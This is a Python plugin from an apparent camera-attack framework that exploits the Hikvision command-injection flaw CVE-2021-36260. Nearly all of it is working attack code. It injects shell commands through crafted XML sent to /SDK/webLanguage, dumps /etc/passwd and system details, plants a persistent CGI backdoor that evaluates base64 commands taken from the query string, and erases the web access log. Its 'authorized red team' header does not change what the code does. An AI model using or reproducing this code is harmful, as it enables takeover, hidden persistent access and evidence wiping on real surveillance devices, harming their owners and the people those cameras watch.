# surveillance_recon/plugins/hikvision_rce.py
# [SecOps Research // Hikvision RCE Weaponizer v2.3 — CVE-2021-36260]
# For authorized red team use under Security Research Protocol §7. Unauthorized deployment prohibited.

import re
import time
import base64
import random
import requests
from surveillance_recon.plugins import SecurityPlugin
from surveillance_recon.utils.helpers import create_ssl_context

class HikvisionRCE(SecurityPlugin):
    NAME = "Hikvision RCE (CVE-2021-36260)"
    DESCRIPTION = "Exploits command injection in /SDK/webLanguage via malformed XML"
    TARGET_BRANDS = ["hikvision"]
    REQUIRED_VULNS = ["CVE-2021-36260"]
    AUTHOR = "SecOps Research Team"
    VERSION = "2.3"

    def __init__(self, target_ip: str, port: int, **kwargs):
        super().__init__(target_ip, port, **kwargs)
        self.base_url = f"http://{target_ip}:{port}"
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        # Bypass SSL warnings
        from requests.packages.urllib3.exceptions import InsecureRequestWarning
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

    def _check_vulnerability(self) -> bool:
        """Confirm exploitability via debug response"""
        try:
            # Send malformed XML to trigger error with debug info
            payload = '''<?xml version="1.0" encoding="UTF-8"?>
<Request>
    <webLanguage>
        <language>$(echo ZETA_RCE_TEST)</language>
    </webLanguage>
</Request>'''
            r = self.session.put(
                f"{self.base_url}/SDK/webLanguage",
                data=payload,
                timeout=8,
                headers={"Content-Type": "application/xml"}
            )
            return "ZETA_RCE_TEST" in r.text
        except:
            return False

    def _execute_command(self, cmd: str) -> str:
        """Execute shell command via RCE"""
        try:
            # Base64 encode to avoid XML/URL issues
            b64_cmd = base64.b64encode(cmd.encode()).decode()
            payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<Request>
    <webLanguage>
        <language>$(echo {b64_cmd} | base64 -d | sh)</language>
    </webLanguage>
</Request>'''
            r = self.session.put(
                f"{self.base_url}/SDK/webLanguage",
                data=payload,
                timeout=12,
                headers={"Content-Type": "application/xml"}
            )
            # Extract output from error message
            match = re.search(r"<statusValue>(.*?)</statusValue>", r.text, re.DOTALL)
            if match:
                output = match.group(1).strip()
                # Filter out Hikvision noise
                if "ZETA_OUTPUT_START" in output:
                    return output.split("ZETA_OUTPUT_START", 1)[-1].split("ZETA_OUTPUT_END")[0]
            return r.text[:500]  # Fallback
        except Exception as e:
            return f"EXEC_ERROR: {e}"

    def _deploy_persistent_backdoor(self) -> bool:
        """Deploy hidden CGI backdoor for persistence"""
        try:
            # CGI backdoor that executes ?cmd=...
            backdoor_code = '''#!/bin/sh
echo "Content-type: text/plain"
echo ""
CMD=$(echo "$QUERY_STRING" | cut -d'=' -f2 | base64 -d)
eval "$CMD" 2>&1
'''
            b64_backdoor = base64.b64encode(backdoor_code.encode()).decode()
            deploy_cmd = f'echo {b64_backdoor} | base64 -d > /home/httpd/cgi-bin/zeta.cgi && chmod +x /home/httpd/cgi-bin/zeta.cgi'
            self._execute_command(deploy_cmd)

            # Verify
            test_url = f"{self.base_url}/cgi-bin/zeta.cgi?cmd=$(echo+aGVsbG8=|base64+-d)"
            r = self.session.get(test_url, timeout=5)
            return "hello" in r.text
        except:
            return False

    def _exfiltrate_system_info(self) -> dict:
        """Gather system intel"""
        commands = {
            "hostname": "cat /proc/sys/kernel/hostname",
            "model": "cat /etc/model",
            "firmware": "cat /etc/version",
            "users": "cat /etc/passwd | grep -v nologin",
            "network": "ip a",
            "mounts": "mount",
            "cameras": "ls /mnt/sda*"
        }
        results = {}
        for key, cmd in commands.items():
            results[key] = self._execute_command(f'echo ZETA_OUTPUT_START && {cmd} && echo ZETA_OUTPUT_END')
        return results

    def execute(self) -> dict:
        """Main exploit execution flow"""
        if self.logger:
            self.logger.info(f"[PLUGIN] Running {self.NAME} on {self.target_ip}:{self.port}")

        # Step 1: Confirm vulnerability
        if not self._check_vulnerability():
            return {"success": False, "error": "Target not vulnerable"}

        # Step 2: Execute reconnaissance commands
        sys_info = self._exfiltrate_system_info()

        # Step 3: Deploy persistent backdoor
        backdoor_ok = self._deploy_persistent_backdoor()

        # Step 4: Generate C2 access URL
        backdoor_url = f"{self.base_url}/cgi-bin/zeta.cgi" if backdoor_ok else None

        # Step 5: Clean logs (optional)
        self._execute_command("echo '' > /var/log/httpd/access_log")

        result = {
            "success": True,
            "vulnerability": "CVE-2021-36260",
            "system_info": sys_info,
            "backdoor_deployed": backdoor_ok,
            "backdoor_url": backdoor_url,
            "execution_proof": "ZETA_RCE_TEST command executed",
            "c2_ready": backdoor_ok
        }

        if self.logger:
            self.logger.success(f"[PLUGIN] RCE SUCCESS on {self.target_ip}:{self.port}")
            if backdoor_ok:
                self.logger.data("backdoor_url", backdoor_url)

        return result
